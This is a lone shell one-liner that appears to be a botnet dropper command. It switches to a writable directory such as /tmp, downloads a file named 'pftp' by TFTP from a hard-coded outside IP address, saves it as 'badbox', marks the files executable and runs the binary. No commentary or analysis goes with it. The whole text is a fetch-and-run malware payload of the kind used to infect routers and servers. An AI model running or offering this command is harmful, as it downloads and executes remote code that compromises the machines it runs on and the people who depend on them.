cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 108.61.23.167 -c get pftp;cat pftp >badbox;chmod +x *;./badbox
